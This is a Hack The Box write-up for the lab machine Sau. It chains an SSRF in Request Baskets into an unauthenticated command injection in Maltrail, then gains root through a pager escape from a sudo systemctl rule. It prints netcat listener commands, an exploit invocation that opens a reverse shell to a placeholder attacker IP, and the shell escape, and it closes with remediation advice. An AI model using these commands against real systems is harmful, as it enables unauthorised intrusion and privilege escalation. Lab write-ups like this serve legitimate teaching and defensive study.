# Sau — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Status** | ✅ Retired |
| **Key techniques** | SSRF (CVE-2023-27163), unauthenticated command injection (Maltrail), `sudo systemctl` pager escape |

---

## TL;DR

Sau chains two separate vulnerabilities in two separate applications through
a Server-Side Request Forgery. A public `Request Baskets` instance is
vulnerable to SSRF, which is used to reach an *internal-only* Maltrail
instance that isn't otherwise exposed — and that instance has its own
unauthenticated command-injection bug. Root comes from a `sudo` rule around
`systemctl status`, exploited through its interactive pager rather than any
flaw in `systemctl` itself.

---

## Recon & Enumeration

```bash
nmap -sVC -O 10.129.229.26
```

![nmap service scan](./assets/sau/01-nmap.png)

SSH, HTTP (80), and an unusual high port, 55555 — hosting **Request
Baskets**, a tool for creating disposable HTTP endpoints that forward
requests elsewhere (commonly used for webhook testing/debugging).

---

## Foothold / Initial Access

![CVE-2023-27163 detail](./assets/sau/02-request-baskets-cve.png)

Request Baskets at this version is vulnerable to **CVE-2023-27163**, a
Server-Side Request Forgery: a basket's "forward URL" isn't restricted to
external targets, meaning it can be pointed at `127.0.0.1` to probe or reach
services that only listen locally on the box itself — services that would be
otherwise invisible to an external scan.

```bash
nc -lvnp 80
```

Creating a basket and forwarding it to my own listener confirmed the SSRF
worked. Redirecting the forward target to `127.0.0.1:80` instead revealed
that port 80 locally was running **Maltrail v0.53** — a network traffic
analysis tool not reachable from outside at all, only through this SSRF
pivot.

Maltrail 0.53 has a well-documented **unauthenticated OS command injection**.
A public exploit script against the SSRF-exposed basket path delivered a
shell directly:

```bash
nc -nlvp 9999
python3 exploit.py <ATTACKER_IP> 9999 https://10.129.229.26:55555/<basket-path>
```

Shell landed as `puma`. User flag retrieved.

---

## Privilege Escalation

`sudo -l` showed `puma` could run one specific command with no password:

```
/usr/bin/systemctl status trail.service
```

![sudo -l showing the systemctl status rule](./assets/sau/03-sudo-systemctl.png)

`systemctl status` output is piped through a pager (`less` by default) when
the output is long enough — and `less` supports an escape to spawn a shell
(`!` followed by a command), inheriting whatever privileges the parent
process has. Since `systemctl` here runs via `sudo`, that shell comes back as
root:

```bash
sudo /usr/bin/systemctl status trail.service
!/bin/bash
```

Root shell obtained, root flag retrieved.

---

## Lessons Learned

- **SSRF isn't just "leaked data" — it's a network pivot.** The real target
  application (Maltrail) was never reachable directly at all; the SSRF was
  the only way to even discover it existed.
- **A narrowly-scoped `sudo` rule can still be a full root shell** if the
  allowed command has any interactive component (a pager, an editor, a
  `less`-based help screen) that supports shell escapes.
- **`sudo -l` output naming a read-only-looking command (`systemctl status`)
  is not automatically safe** — the command's *output handling*, not just
  its stated purpose, is what matters.

---

## Remediation

- Patch Request Baskets and restrict forward-URL targets to an explicit
  allow-list, blocking loopback/internal ranges by default.
- Patch or remove Maltrail; never assume "internal-only" binding is
  sufficient protection against SSRF pivots.
- When granting `sudo` for read-only-seeming commands, force non-interactive
  output (`--no-pager`, or `SYSTEMD_PAGER=cat`) to eliminate the pager escape
  entirely.

---

**Machine:** [Hack The Box — Sau](https://www.hackthebox.com/machines/sau)
